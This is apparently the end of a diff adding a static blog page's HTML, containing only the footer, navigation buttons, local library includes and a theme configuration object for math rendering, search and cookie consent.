+        <div class="footer-container"><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Chinchin</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="stylesheet" href="/lib/katex/copy-tex.min.css"><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/typeit/index.umd.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/mhchem.min.js"></script><script type="text/javascript" src="/lib/cookieconsent/cookieconsent.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{},"cookieconsent":{"content":{"dismiss":"Got it!","link":"Learn more","message":"This website uses Cookies to improve your experience."},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"data":{"id-1":"首页","id-2":"首页"},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":10,"noResultsFound":"No results found","snippetLength":50,"type":"lunr"},"typeit":{"cursorChar":"|","cursorSpeed":1000,"data":{"id-1":["id-1"],"id-2":["id-2"]},"duration":-1,"speed":100}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
